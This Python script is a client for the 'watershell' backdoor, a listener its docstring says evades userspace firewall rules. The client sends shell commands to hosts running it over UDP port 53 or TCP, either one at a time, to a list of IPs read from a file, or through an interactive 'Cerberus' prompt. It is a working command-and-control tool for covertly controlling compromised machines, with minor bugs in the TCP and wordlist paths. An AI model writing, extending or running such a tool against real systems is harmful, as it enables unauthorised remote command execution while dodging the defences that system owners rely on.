#!/usr/bin/env python3

"""
Watershell client; a script to easily send commands over UDP or TCP to hosts running
the watershell listening binary. The watershell will be listening for UDP data
on a lower level of the network stack to bypass userspace firewall rules.
"""

import argparse
import socket
import time
import sys
import random

def recv_timeout(the_socket, timeout=4):
    """
    Attempt to listen for data until the specified timeout is reached.

    Returns:
        str - Data received over socket
    """
    the_socket.setblocking(0)
    total_data = []
    begin = time.time()
    
    while True:
        if total_data and time.time() - begin > timeout:
            break
        elif time.time() - begin > timeout:
            break
        
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data.decode())
                begin = time.time()
            else:
                time.sleep(0.1)
        except BaseException as exc:
            pass

    return ''.join(total_data)

def declare_args():
    """
    Define command-line arguments for watershel-cli.py
    """
    parser = argparse.ArgumentParser(
        description="Watershell client to send commands to hosts with watershell listening over UDP/TCP.")
    
    parser.add_argument(
        '-t', '--target',
        dest='target',
        type=str,
        required=True,
        help="Single IP target to send UDP/TCP message to (with -c option).")
    
    parser.add_argument(
        '-T', '--tcp',
        dest='tcp_bool',
        action='store_true',
        required=False,
        help="Use TCP instead of UDP. (experimental)")
    
    parser.add_argument(
        '-p', '--port',
        dest='port',
        type=int,
        default=53,
        help="Port to send UDP/TCP message to.")
    
    parser.add_argument(
        '-c', '--command',
        dest='command',
        type=str,
        help="Single command to send to each IP target.")
    
    parser.add_argument(
        '-i', '--interactive',
        dest='interactive',
        action='store_true',
        default=False,
        help="Interactively send commands to a single IP target.")
    
    parser.add_argument(
        '-l', '--wordlist',
        dest='wordlist',
        type=str,
        help="Path to the wordlist file containing a list of IP addresses.")

    return parser

def send_command_to_target(sock, target, command, tcp_bool):
    """
    Send a command to a single target IP address over UDP or TCP.
    """
    if tcp_bool:
        sock.connect(target)
        sock.send(("run:" + command).encode())
    else:
        sock.sendto(("run:" + command).encode(), target)
        resp = recv_timeout(sock, 4)
        print(f"Response from {target}: {resp}")

def execute_cmd_prompt(sock, target, tcp_bool):
    """
    Interactively prompt user for commands and execute them
    """
    if tcp_bool:
        sock.connect(target)

    while True:
        cmd = input("¯\_(ツ)_/¯Cerberus¯\_(ツ)_/¯->-> ")
        if cmd.lower() == 'exit':
            break
        if len(cmd) > 1:
            if not tcp_bool:
                sock.sendto(("run:" + cmd).encode(), target)
                resp = recv_timeout(sock, 4)
                print(resp)
            else:
                sock.send(("run:" + cmd).encode())

def main():
    """
    Entry point to watershell-cli.py.
    """
    args = declare_args().parse_args()

    if args.interactive:
        # Display ASCII art upon entering interactive mode
        print(r"""
                         /\_/\____,
               ,___/\_/\ \  ~     /
               \     ~  \ )   XXX
                 XXX     /    /\_/\___,
                    \o-o/-o-o/   ~    /
                     ) /     \    XXX
                    _|    / \ \_/
                 ,-/   _  \_/   \
                / (   /____,__|  )
               (  |_ (    )  \) _|
              _/ _)   \   \__/   (_
             (,-(,(,(,/      \,),),
        """)

        target = (args.target, args.port)
        s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
        
        while True:
            cmd = input("¯\_(ツ)_/¯Cerberus¯\_(ツ)_/¯->-> ")
            if cmd.lower() == 'exit':
                break
            send_command_to_target(s_socket, target, cmd, args.tcp_bool)
        
        s_socket.close()
    
    elif args.command:
        target = (args.target, args.port)
        s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
        send_command_to_target(s_socket, target, args.command, args.tcp_bool)
        s_socket.close()

    elif args.wordlist:
        with open(args.wordlist, 'r') as f:
            for line in f:
                ip = line.strip()
                if ip:
                    target = (ip, args.port)
                    s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if args.tcp_bool else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s_socket.connect(target) if args.tcp_bool else s_socket.bind(("0.0.0.0", random.randint(40000, 65353)))
                    send_command_to_target(s_socket, target, args.command, args.tcp_bool)
                    s_socket.close()

if __name__ == '__main__':
    main()
